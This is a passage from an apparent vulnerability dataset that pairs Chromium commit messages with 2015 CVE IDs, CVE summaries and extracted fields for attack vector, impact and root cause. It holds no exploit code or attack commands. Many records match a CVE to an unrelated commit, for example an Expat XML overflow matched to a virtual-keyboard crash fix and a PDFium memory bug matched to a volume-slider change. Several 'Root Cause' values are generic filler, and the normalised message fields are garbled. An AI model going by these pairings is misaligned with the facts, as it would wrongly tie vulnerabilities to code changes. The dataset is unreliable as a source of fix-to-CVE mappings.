Ic36f0fb39f2dbdf49d2bec9e548a4a6e339dc9a2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/848245\nReviewed-by: Mounir Lamouri <mlamouri@chromium.org>\nReviewed-by: Yuri Wiitala <miu@chromium.org>\nCommit-Queue: Tommy Steimel <steimel@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#526825}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 45.0.2454.85 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"fix nullptr crash in issitemuted this cl add a nullptr check in issitemuted to prevent a crash on mac","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"74fce5949bdf05a92c2bc0bd98e6e3e977c55376","cve_id":"CVE-2015-1271","cwe_id":"CWE-119","commit_message":"Fixed volume slider element event handling\n\nMediaControlVolumeSliderElement::defaultEventHandler has making\nredundant calls to setVolume() & setMuted() on mouse activity. E.g. if\na mouse click changed the slider position, the above calls were made 4\ntimes, once for each of these events: mousedown, input, mouseup,\nDOMActive, click. This crack got exposed when PointerEvents are enabled\nby default on M55, adding pointermove, pointerdown & pointerup to the\nlist.\n\nThis CL fixes the code to trigger the calls to setVolume() & setMuted()\nonly when the slider position is changed. Also added pointer events to\ncertain lists of mouse events in the code.\n\nBUG=677900\n\nReview-Url: https:\/\/codereview.chromium.org\/2622273003\nCr-Commit-Position: refs\/heads\/master@{#446032}","summary":"PDFium, as used in Google Chrome before 44.0.2403.89, does not properly handle certain out-of-memory conditions, which allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via a crafted PDF document that triggers a large memory allocation.","commit_message_1":"fixed volume slider element event handling mediacontrolvolumesliderelement : :defaulteventhandler ha making redundant call to setvolume ( ) & setmuted ( ) on mouse activity","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted pdf document that triggers a large memory allocation","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"does not properly handle certain out - of - memory conditions","Attack Type":"remote attacker"},{"commit_id":"3d3dfcd34e38fcecaa1ff14bcd12cbc98259f36c","cve_id":"CVE-2015-1273","cwe_id":"CWE-119","commit_message":"Fix AutoplayUmaHelper when autoplay is initiated from multiple sources\n\nThis CL makes AutoplayUmaHelper to handle the case where the page\nautoplays by both attribute and play() method. Therefore we can avoid\ncounting the metrics into the wrong bucket.\n\nBUG=699176\n\nReview-Url: https:\/\/codereview.chromium.org\/2767093002\nCr-Commit-Position: refs\/heads\/master@{#459215}","summary":"Heap-based buffer overflow in j2k.c in OpenJPEG before r3002, as used in PDFium in Google Chrome before 44.0.2403.89, allows remote attackers to cause a denial of service or possibly have unspecified other impact via invalid JPEG2000 data in a PDF document.","commit_message_1":"fix autoplayumahelper when autoplay is initiated from multiple source this cl make autoplayumahelper to handle the case where the page autoplays by both attribute and play ( ) method","Vulnerability Type":"buffer overflow","Attack Vector":"via invalid jpeg2000 data in a pdf document","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d27468a832d5316884bd02f459cbf493697fd7e1","cve_id":"CVE-2015-1274","cwe_id":"CWE-254","commit_message":"Switch to equalIgnoringASCIICase throughout modules\/accessibility\n\nBUG=627682\n\nReview-Url: https:\/\/codereview.chromium.org\/2793913007\nCr-Commit-Position: refs\/heads\/master@{#461858}","summary":"Google Chrome before 44.0.2403.89 does not ensure that the auto-open list omits all dangerous file types, which makes it easier for remote attackers to execute arbitrary code by providing a crafted file and leveraging a user's previous *Always open files of this type* choice, related to download_commands.cc and download_prefs.cc.","commit_message_1":"switch to equalignoringasciicase throughout modules\/accessibility","Vulnerability Type":"Security Features","Attack Vector":"by providing a crafted file and leveraging a user ' s previous * always open files of this type * choice , related to download _ commands . cc and download _ prefs . cc .","Impact":"execute arbitrary code","Root Cause":"does not ensure that the auto - open list omits all dangerous file types","Attack Type":"remote attacker"},{"commit_id":"bc1f34b9be509f1404f0bb1ba1947614d5f0bcd1","cve_id":"CVE-2015-1280","cwe_id":"CWE-119","commit_message":"media: Support hosting mojo CDM in a standalone service\n\nCurrently when mojo CDM is enabled it is hosted in the MediaService\nrunning in the process specified by \"mojo_media_host\". However, on\nsome platforms we need to run mojo CDM and other mojo media services in\ndifferent processes. For example, on desktop platforms, we want to run\nmojo video decoder in the GPU process, but run the mojo CDM in the\nutility process.\n\nThis CL adds a new build flag \"enable_standalone_cdm_service\". When\nenabled, the mojo CDM service will be hosted in a standalone \"cdm\"\nservice running in the utility process. All other mojo media services\nwill sill be hosted in the \"media\" servie running in the process\nspecified by \"mojo_media_host\".\n\nBUG=664364\nTEST=Encrypted media browser tests using mojo CDM is still working.\n\nChange-Id: I95be6e05adc9ebcff966b26958ef1d7becdfb487\nReviewed-on: https:\/\/chromium-review.googlesource.com\/567172\nCommit-Queue: Xiaohan Wang <xhwang@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: John Abd-El-Malek <jam@chromium.org>\nReviewed-by: Dan Sanders <sandersd@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#486947}","summary":"SkPictureShader.cpp in Skia, as used in Google Chrome before 44.0.2403.89, allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging access to a renderer process and providing crafted serialized data.","commit_message_1":"support hosting mojo cdm in a standalone service currently when mojo cdm is enabled it is hosted in the mediaservice running in the process specified by `` mojo_media_host ''","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging access to a renderer process and providing crafted serialized data","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a memory corruption error","Attack Type":"remote attacker"},{"commit_id":"dff368031150a1033a1a3c913f8857679a0279be","cve_id":"CVE-2015-1281","cwe_id":"CWE-254","commit_message":"Correctly keep track of isolates for microtask execution\n\nBUG=487155\nR=haraken@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1161823002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@195985 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"core\/loader\/ImageLoader.cpp in Blink, as used in Google Chrome before 44.0.2403.89, does not properly determine the V8 context of a microtask, which allows remote attackers to bypass Content Security Policy (CSP) restrictions by providing an image from an unintended source.","commit_message_1":"correctly keep track of isolates for microtask execution bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Security Features","Attack Vector":"by providing an image from an unintended source","Impact":"bypass content security policy ( csp ) restrictions","Root Cause":"does not properly determine the v8 context of a microtask","Attack Type":"remote attacker"},{"commit_id":"d10065ae8b87f4eefe50d756f9c3464832c40bcf","cve_id":"CVE-2015-1283","cwe_id":"CWE-189","commit_message":"Fix crash happens when VK tray is clicked after VK is disabled.\n\nBug: 749989\nTest: manually\nChange-Id: I547151f5950e07e3669d0f13ce41b951cd354f4f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/593434\nReviewed-by: Mitsuru Oshima <oshima@chromium.org>\nReviewed-by: Keigo Oka <oka@chromium.org>\nCommit-Queue: Keigo Oka <oka@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#492052}","summary":"Multiple integer overflows in the XML_GetBuffer function in Expat through 2.1.0, as used in Google Chrome before 44.0.2403.89 and other products, allow remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted XML data, a related issue to CVE-2015-2716.","commit_message_1":"fix crash happens when vk tray is clicked after vk is disabled","Vulnerability Type":"integer overflow","Attack Vector":"via crafted xml data , a related issue to cve - 2015 - 2716","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by multiple integer overflows","Attack Type":"remote attacker"},{"commit_id":"7923c2a2c443d98c432864e361b1d090f0c911ca","cve_id":"CVE-2015-1286","cwe_id":"CWE-79","commit_message":"Add a test that getModuleSystem() doesn't work cross origin\n\nBUG=504011\nR=kalman@chromium.org\nTBR=fukino@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1241443004\n\nCr-Commit-Position: refs\/heads\/master@{#338663}","summary":"Cross-site scripting (XSS) vulnerability in the V8ContextNativeHandler::GetModuleSystem function in extensions\/renderer\/v8_context_native_handler.cc in Google Chrome before 44.0.2403.89 allows remote attackers to inject arbitrary web script or HTML by leveraging the lack of a certain V8 context restriction, aka a Blink *Universal XSS (UXSS).*","commit_message_1":"add a test that getmodulesystem ( ) doe n't work cross origin bug=<number> tb review url : http : \/\/<file>","Vulnerability Type":"Cross-site Scripting","Attack Vector":"by leveraging the lack of a certain v8 context restriction , aka a blink * universal xss ( uxss )","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input","Attack Type":"remote attacker"},{"commit_id":"4e7c52b4577b682be39ad617ceb5d98a32279939","cve_id":"CVE-2015-1272","cwe_id":null,"commit_message":"Network traffic annotation added to extensions::image_writer::WriteFromUrlOperation.\n\nNetwork traffic annotation is added to network request of extensions::image_writer::WriteFromUrlOperation.\n\nBUG=656607\n\nReview-Url: https:\/\/codereview.chromium.org\/2691963002\nCr-Commit-Position: refs\/heads\/master@{#451456}","summary":"Use-after-free vulnerability in the GPU process implementation in Google Chrome before 44.0.2403.89 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging the continued availability of a GPUChannelHost data structure during Blink shutdown, related to content\/browser\/gpu\/browser_gpu_channel_host_factory.cc and content\/renderer\/render_thread_impl.cc.","commit_message_1":"network traffic annotation added to extension : :image_writer : :writefromurloperation","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging the continued availability of a gpuchannelhost data structure during blink shutdown , related to content \/ browser \/ gpu \/ browser _ gpu _ channel _ host _ factory . cc and content \/ renderer \/ render _ thread _ impl . cc","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error related to unexpected GPU process termination","Attack Type":"remote attacker"},{"commit_id":"8dc07f045c6287da3404fa8e0fd8b1b3960afbfa","cve_id":"CVE-2015-1277","cwe_id":null,"commit_message":"When serializing accessibility tree, skip invalid children.\n\nSee bug for specific repro in the wild, but essentially we need to check\nif the child is valid just before serializing, and not trust the list of\nchildren of a node.\n\nBUG=479743\n\nReview URL: https:\/\/codereview.chromium.org\/1144363004\n\nCr-Commit-Position: refs\/heads\/master@{#332748}","summary":"Use-after-free vulnerability in the accessibility implementation in Google Chrome before 44.0.2403.89 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging lack of certain validity checks for accessibility-tree data structures.","commit_message_1":"when serializing accessibility tree , skip invalid child","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging lack of certain validity checks for accessibility - tree data structures","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"784f56a9c97a838448dd23f9bdc7c05fe8e639b3","cve_id":"CVE-2015-1278","cwe_id":"CWE-254","commit_message":"Correctly reset FP in RFHI whenever origin changes\n\nBug: 713364\nChange-Id: Id8bb923750e20f3db6fc9358b1d44120513ac95f\n\nCQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation\n\nChange-Id: Id8bb923750e20f3db6fc9358b1d44120513ac95f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/482380\nCommit-Queue: Ian Clelland <iclelland@chromium.org>\nReviewed-by: Charles Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#466778}","summary":"content\/browser\/web_contents\/web_contents_impl.cc in Google Chrome before 44.0.2403.89 does not ensure that a PDF document's modal dialog is closed upon navigation to an interstitial page, which allows remote attackers to spoof URLs via a crafted document, as demonstrated by the alert_dialog.pdf document.","commit_message_1":"correctly reset fp in rfhi whenever origin change cq_include_trybots=<file>","Vulnerability Type":"Security Features","Attack Vector":"via a crafted document , as demonstrated by the alert _ dialog . pdf document ","Impact":"spoof urls","Root Cause":"does not ensure that a pdf document ' s modal dialog is closed upon navigation to an interstitial page","Attack Type":"remote attacker"},{"commit_id":"39595f8d4dffcb644d438106dcb64a30c139ff0e","cve_id":"CVE-2015-1285","cwe_id":"CWE-200","commit_message":"[reland] Do not set default wallpaper unless it should do so.\n\nTBR=bshe@chromium.org, alemate@chromium.org\n\nBug: 751382\nChange-Id: Id0793dfe467f737526a95b1e66ed01fbb8860bda\nReviewed-on: https:\/\/chromium-review.googlesource.com\/619754\nCommit-Queue: Xiaoqian Dai <xdai@chromium.org>\nReviewed-by: Alexander Alekseev <alemate@chromium.org>\nReviewed-by: Biao She <bshe@chromium.org>\nCr-Original-Commit-Position: refs\/heads\/master@{#498325}\nReviewed-on: https:\/\/chromium-review.googlesource.com\/646430\nCr-Commit-Position: refs\/heads\/master@{#498982}","summary":"The XSSAuditor::canonicalize function in core\/html\/parser\/XSSAuditor.cpp in the XSS auditor in Blink, as used in Google Chrome before 44.0.2403.89, does not properly choose a truncation point, which makes it easier for remote attackers to obtain sensitive information via an unspecified linear-time attack.","commit_message_1":"do not set default wallpaper unless it should do so","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via an unspecified linear - time attack","Impact":"obtain sensitive information","Root Cause":"does not properly choose a truncation point","Attack Type":"remote attacker"},{"commit_id":"ce1a9c0e454b08c96ca73788a1b4dccb405ce027","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Move ImageLoader timer to frame-specific TaskRunnerTimer.\n\nMove ImageLoader timer m_derefElementTimer to frame-specific TaskRunnerTimer.\nThis associates it with the frame's Networking timer task queue.\n\nBUG=624694\n\nReview-Url: https:\/\/codereview.chromium.org\/2642103002\nCr-Commit-Position: refs\/heads\/master@{#444927}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"move imageloader timer to frame-specific taskrunnertimer","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"c1edcafcbe5b8fa20d7e1adb2d1a5322924d8df0","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Explicitly enforce values size in feColorMatrix.\n\nR=senorblanco@chromium.org\nBUG=468519\n\nReview URL: https:\/\/codereview.chromium.org\/1075413002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@193571 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"explicitly enforce value size in fecolormatrix","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"04ff52bb66284467ccb43d90800013b89ee8db75","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Switching AudioOutputAuthorizationHandler from using AudioManager interface to AudioSystem one.\n\nBUG=672468\nCQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\n\nReview-Url: https:\/\/codereview.chromium.org\/2692203003\nCr-Commit-Position: refs\/heads\/master@{#450939}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"switching audiooutputauthorizationhandler from using audiomanager interface to audiosystem one","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"262e77a72493e36e8006aeeba1c7497a42ee5ad9","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"WebVR: fix initial vsync\n\nApplications sometimes use window.rAF while not presenting, then switch to\nvrDisplay.rAF after presentation starts. Depending on the animation loop's\ntiming, this can cause a race condition where presentation has been started\nbut there's no vrDisplay.rAF pending yet. Ensure there's at least vsync\nbeing processed after presentation starts so that a queued window.rAF\ncan run and schedule a vrDisplay.rAF.\n\nBUG=711789\n\nReview-Url: https:\/\/codereview.chromium.org\/2848483003\nCr-Commit-Position: refs\/heads\/master@{#468167}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"fix initial vsync application sometimes use <file> while not presenting , then switch to <file> after presentation start","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"d8fccaec4e73a9120074293c1997f963f810c9dd","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Always initialize |m_totalWidth| in HarfBuzzShaper::shape.\n\nR=leviw@chromium.org\nBUG=476647\n\nReview URL: https:\/\/codereview.chromium.org\/1108663003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@194541 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"always initialize |m_totalwidth| in harfbuzzshaper : :shape","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"7c28e7988fef9bb3e03027226bd199736d99abc3","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Add PersistenceDelegate to HostCache\n\nPersistenceDelegate is a new interface for persisting the contents of\nthe HostCache. This commit includes the interface itself, the logic in\nHostCache for interacting with it, and a mock implementation of the\ninterface for testing. It does not include support for immediate data\nremoval since that won't be needed for the currently planned use case.\n\nBUG=605149\n\nReview-Url: https:\/\/codereview.chromium.org\/2943143002\nCr-Commit-Position: refs\/heads\/master@{#481015}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"add persistencedelegate to hostcache persistencedelegate is a new interface for persisting the content of the hostcache","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"8ea5693d5cf304e56174bb6b65412f04209904db","cve_id":"CVE-2015-1265","cwe_id":null,"commit_message":"Move Editor::Transpose() out of Editor class\n\nThis patch moves |Editor::Transpose()| out of |Editor| class as preparation of\nexpanding it into |ExecutTranspose()| in \"EditorCommand.cpp\" to make |Editor|\nclass simpler for improving code health.\n\nFollowing patch will expand |Transpose()| into |ExecutTranspose()|.\n\nBug: 672405\nChange-Id: Icde253623f31813d2b4517c4da7d4798bd5fadf6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/583880\nReviewed-by: Xiaocheng Hu <xiaochengh@chromium.org>\nCommit-Queue: Yoshifumi Inoue <yosin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#489518}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 43.0.2357.65 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"out of editor class this patch move |editor : :transpose ( ) | out of |editor| class a preparation of expanding it into |executtranspose ( ) | in `` <file> '' to make |editor| class simpler for improving code health","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"3f71619ec516f553c69a08bf373dcde14e86d08f","cve_id":"CVE-2015-1249","cwe_id":null,"commit_message":"Provide experimental contextual suggestions when current URL comes from a google domain.\n\nThe counts for the Omnibox.ZeroSuggestRequests historgram are 35% smaller for groups that are running under the ZeroSuggestRedirectToChrome flag. Note that previous to this CL, a request was not made when the user was visiting an HTTPS page and the domain of the current was different from that of the service providing zero suggestions. This CL addresses this restrictions by making sure that requests are sent to the experimental service when Google is the default search engine AND the same request was validated to be sent to Google.\n\nBUG=692471\n\nReview-Url: https:\/\/codereview.chromium.org\/2915163003\nCr-Commit-Position: refs\/heads\/master@{#476786}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 42.0.2311.90 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"provide experimental contextual suggestion when current url come from a google domain","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"5576cbc1d3e214dfbb5d3ffcdbe82aa8ba0088fc","cve_id":"CVE-2015-1232","cwe_id":"CWE-119","commit_message":"MidiManagerUsb should not trust indices provided by renderer.\n\nMidiManagerUsb::DispatchSendMidiData takes |port_index| parameter. As it is\nprovided by a renderer possibly under the control of an attacker, we must\nvalidate the given index before using it.\n\nBUG=456516\n\nReview URL: https:\/\/codereview.chromium.org\/907793002\n\nCr-Commit-Position: refs\/heads\/master@{#315303}","summary":"Array index error in the MidiManagerUsb::DispatchSendMidiData function in media\/midi\/midi_manager_usb.cc in Google Chrome before 41.0.2272.76 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging renderer access to provide an invalid port index that triggers an out-of-bounds write operation, a different vulnerability than CVE-2015-1212.","commit_message_1":"midimanagerusb should not trust index provided by renderer","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging renderer access to provide an invalid port index that triggers an out - of - bounds write operation , a different vulnerability than cve - 2015 - 1212","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"faaa2fd0a05f1622d9a8806da118d4f3b602e707","cve_id":"CVE-2015-1213","cwe_id":"CWE-119","commit_message":"[Blink>Media] Allow autoplay muted on Android by default\n\nThere was a mistake causing autoplay muted is shipped on Android\nbut it will be disabled if the chromium embedder doesn't specify\ncontent setting for \"AllowAutoplay\" preference. This CL makes the\nAllowAutoplay preference true by default so that it is allowed by\nembedders (including AndroidWebView) unless they explicitly\ndisable it.\n\nIntent to ship:\nhttps:\/\/groups.google.com\/a\/chromium.org\/d\/msg\/blink-dev\/Q1cnzNI2GpI\/AL_eyUNABgAJ\n\nBUG=689018\n\nReview-Url: https:\/\/codereview.chromium.org\/2677173002\nCr-Commit-Position: refs\/heads\/master@{#448423}","summary":"The SkBitmap::ReadRawPixels function in core\/SkBitmap.cpp in the filters implementation in Skia, as used in Google Chrome before 41.0.2272.76, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger an out-of-bounds write operation.","commit_message_1":"allow autoplay muted on android by default there wa a mistake causing autoplay muted is shipped on android but it will be disabled if the chromium embedder doe n't specify content setting for `` allowautoplay '' preference","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger an out - of - bounds write operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"a81c185f34b34ef8410239506825b185b332c00b","cve_id":"CVE-2015-1214","cwe_id":"CWE-190","commit_message":"Add data usage tracking for chrome services\n\nAdd data usage tracking for captive portal, web resource and signin services\n\nBUG=655749\n\nReview-Url: https:\/\/codereview.chromium.org\/2643013004\nCr-Commit-Position: refs\/heads\/master@{#445810}","summary":"Integer overflow in the SkAutoSTArray implementation in include\/core\/SkTemplates.h in the filters implementation in Skia, as used in Google Chrome before 41.0.2272.76, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger a reset action with a large count value, leading to an out-of-bounds write operation.","commit_message_1":"add data usage tracking for chrome service","Vulnerability Type":"integer overflow","Attack Vector":"via vectors that trigger a reset action with a large count value , leading to an out - of - bounds write operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"2bceda4948deeaed0a5a99305d0d488eb952f64f","cve_id":"CVE-2015-1215","cwe_id":"CWE-119","commit_message":"Allow serialization of empty bluetooth uuids.\n\nThis change allows the passing WTF::Optional<String> types as\nbluetooth.mojom.UUID optional parameter without needing to ensure the passed\nobject isn't empty.\n\nBUG=None\n\nR=juncai, dcheng\n\nReview-Url: https:\/\/codereview.chromium.org\/2646613003\nCr-Commit-Position: refs\/heads\/master@{#445809}","summary":"The filters implementation in Skia, as used in Google Chrome before 41.0.2272.76, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger an out-of-bounds write operation.","commit_message_1":"allow serialization of empty bluetooth uuids","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger an out - of - bounds write operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"fc81fcf38edd250876cc384a6ed5567e1b2999e4","cve_id":"CVE-2015-1217","cwe_id":"CWE-17","commit_message":"Turn a bunch of ASSERTs into graceful failures when compiling listeners\n\nBUG=456192\nR=yangguo@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/906193002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@189796 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The V8LazyEventListener::prepareListenerObject function in bindings\/core\/v8\/V8LazyEventListener.cpp in the V8 bindings in Blink, as used in Google Chrome before 41.0.2272.76, does not properly compile listeners, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that leverage *type confusion.*","commit_message_1":"turn a bunch of asserts into graceful failure when compiling listener bug=<number> review url : http : \/\/<file>","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"impact via vectors that leverage * type confusion","Impact":"cause a denial of service or possibly have unspecified other","Root Cause":"caused by a type confusion error within v8 bindings","Attack Type":"remote attacker"},{"commit_id":"53f40b0658b240dd7397a58b29b083631519735f","cve_id":"CVE-2015-1218","cwe_id":null,"commit_message":"Make Sber1\/2 pref metrics into Nullable Booleans so we can track how often these prefs are unset.\n\nBUG=699139\n\nReview-Url: https:\/\/codereview.chromium.org\/2739643003\nCr-Commit-Position: refs\/heads\/master@{#456059}","summary":"Multiple use-after-free vulnerabilities in the DOM implementation in Blink, as used in Google Chrome before 41.0.2272.76, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger movement of a SCRIPT element to different documents, related to (1) the HTMLScriptElement::didMoveToNewDocument function in core\/html\/HTMLScriptElement.cpp and (2) the SVGScriptElement::didMoveToNewDocument function in core\/svg\/SVGScriptElement.cpp.","commit_message_1":"make sber1\/<number> pref metric into nullable booleans so we can track how often these prefs are unset","Vulnerability Type":"use - after - free","Attack Vector":"via vectors that trigger movement of a script element to different documents , related to ( 1 ) the htmlscriptelement : : didmovetonewdocument function in core \/ html \/ htmlscriptelement . cpp and ( 2 ) the svgscriptelement : : didmovetonewdocument function in core \/ svg \/ svgscriptelement . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within dom","Attack Type":"remote attacker"},{"commit_id":"4f9c9adef4036aff60b734b4a0045c43c320fe1d","cve_id":"CVE-2015-1220","cwe_id":null,"commit_message":"Fix handling of broken GIFs with weird frame sizes\n\nCode didn't handle well if a GIF frame has dimension greater than the\n\"screen\" dimension. This will break deferred image decoding.\n\nThis change reports the size as final only when the first frame is\nencountered.\n\nAdded a test to verify this behavior. Frame size reported by the decoder\nshould be constant.\n\nBUG=437651\nR=pkasting@chromium.org, senorblanco@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/813943003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@188423 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the GIFImageReader::parseData function in platform\/image-decoders\/gif\/GIFImageReader.cpp in Blink, as used in Google Chrome before 41.0.2272.76, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted frame size in a GIF image.","commit_message_1":"fix handling of broken gifs with weird frame size code did n't handle well if a gif frame ha dimension greater than the '' screen '' dimension","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted frame size in a gif image","Impact":"cause a denial of service or possibly have unspecified other","Root Cause":"caused by a use-after-free error within gif decoder","Attack Type":"remote attacker"},{"commit_id":"a69c7b5d863dacbb08bfaa04359e3bc0bb4470dc","cve_id":"CVE-2015-1221","cwe_id":null,"commit_message":"Make TypingCommand::insertText() to take SelectionInDOMTree instead of VisibleSelection\n\nThis patch makes |TypingCommand::insertText()| to take |SelectionInDOMTree|\ninstead of |VisibleSelection| to reduce usage of |VisibleSelection| for\nimproving code health.\n\nBUG=657237\nTEST=n\/a\n\nReview-Url: https:\/\/codereview.chromium.org\/2733183002\nCr-Commit-Position: refs\/heads\/master@{#455368}","summary":"Use-after-free vulnerability in Blink, as used in Google Chrome before 41.0.2272.76, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging incorrect ordering of operations in the Web SQL Database thread relative to Blink's main thread, related to the shutdown function in web\/WebKit.cpp.","commit_message_1":"to take selectionindomtree instead of visibleselection this patch make |typingcommand : :inserttext ( ) | to take |selectionindomtree| instead of |visibleselection| to reduce usage of |visibleselection| for improving code health","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging incorrect ordering of operations in the web sql database thread relative to blink ' s main thread , related to the shutdown function in web \/ webkit . cpp ","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within web databases","Attack Type":"remote attacker"},{"commit_id":"b0d271768d0a592227d753f4cf60399c4dd2af4f","cve_id":"CVE-2015-1223","cwe_id":null,"commit_message":"PermissionUtil::GetPermissionType needs to handle MIDI\n\nAfter the recent PermissionManager's 